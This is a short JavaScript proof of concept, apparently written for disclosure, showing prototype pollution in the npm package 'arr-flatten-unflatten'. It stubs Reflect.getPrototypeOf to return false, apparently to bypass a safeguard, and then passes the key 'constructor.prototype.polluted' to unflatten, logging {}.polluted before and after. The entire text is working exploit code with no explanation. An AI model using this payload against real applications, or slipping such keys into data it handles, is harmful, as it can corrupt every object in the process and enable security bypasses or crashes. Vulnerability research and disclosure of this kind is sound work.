Reflect.getPrototypeOf = () => false;
console.log({}.polluted);
const {unflatten} = require('arr-flatten-unflatten');
unflatten({ 'constructor.prototype.polluted': 'yes' });
console.log({}.polluted);